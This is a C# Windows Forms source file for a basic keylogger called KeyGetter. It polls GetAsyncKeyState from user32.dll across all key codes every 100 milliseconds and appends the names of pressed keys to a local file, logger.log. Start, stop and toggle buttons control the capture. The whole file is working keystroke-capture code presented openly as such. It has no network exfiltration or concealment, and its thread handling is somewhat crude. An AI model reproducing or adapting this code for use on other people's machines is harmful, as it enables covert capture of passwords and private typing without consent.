using System.Runtime.InteropServices;

namespace KeyGetter
{
    public partial class KeyGetter : Form
    {

        bool tst = true;
        ThreadStart ts;
        Task th;
        public KeyGetter()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            button1.Text = "Start";
            button2.Text = "Is " + tst.ToString();
            button3.Text = "Stop";
            button3.Enabled = false;
        }

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        private void button1_Click(object sender, EventArgs e)
        {

            th = Task.Factory.StartNew(Logg);
            button1.Enabled = false;
            button3.Enabled = false;
        }
        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
        private void button2_Click(object sender, EventArgs e)
        {
            tst = (tst) ? false : true;
            button2.Text = "Is " + tst.ToString();
            button3.Enabled = tst ? false : true;
        }
        private void Logg()
        {
            string buf = string.Empty;
            while (tst)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if (state != 0)
                    {
                        buf += ((Keys)i).ToString() + ";";
                        if (buf.Length > 10)
                        {
                            File.AppendAllText("logger.log", buf);
                            buf = string.Empty;
                        }
                    }
                }
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            th.Dispose();
            button1.Enabled = true;
            button3.Enabled = false;
        }
    }
}